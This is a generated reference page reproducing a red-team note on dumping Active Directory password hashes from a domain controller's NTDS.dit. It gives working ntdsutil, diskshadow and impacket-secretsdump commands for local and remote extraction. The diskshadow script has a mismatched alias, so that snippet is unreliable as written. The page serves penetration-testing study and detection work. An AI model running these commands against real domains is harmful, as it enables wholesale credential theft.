---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Domain Controller Hashes Locally and Remotely

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-ntds.dit-enumeration` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:

## Preserved Body

````markdown
## No Credentials - ntdsutil

If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:
```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

![](<../../_assets/ntdsutil-attacker.png>)

We can then dump password hashes offline with impacket:
```bash
root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```
![](<../../_assets/ntds-hashdump (1).png>)

## No Credentials - diskshadow

On Windows Server 2008+, we can use diskshadow to grab the ntdis.dit.

Create a shadowdisk.exe script instructing to create a new shadow disk copy of the disk C (where ntds.dit is located in our case) and expose it as drive Z:\\
```erlang
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %someAlias% z:
```
...and now execute the following:

```erlang
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

Below shows the ntds.dit got etracted and placed into our c:\exfil folder:

![](<../../_assets/image (406).png>)

Inside interactive diskshadow utility, clean up the shadow volume:

```
diskshadow.exe
    > delete shadows volume trophy
    > reset
```

## With Credentials

If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:

```
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

![](<../../_assets/image (223).png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/dumping-domain-controller-hashes-locally-and-remotely.md)

## Evidence Excerpt

````text
_asset_filenames:
- image (223).png
- image (406).png
- ntds-hashdump (1).png
- ntdsutil-attacker.png
_body: "---\ndescription: Dumping NTDS.dit with Active Directory users hashes\n---\n\n# Dumping Domain Controller Hashes Locally\
\ and Remotely\n\n## No Credentials - ntdsutil\n\nIf you have no credentials, but you have access to the DC, it's possible\
\ to dump the ntds.dit using a lolbin ntdsutil.exe:\n\n{% tabs %}\n{% tab title=\"attacker@victim\" %}\n```bash\npowershell\
````
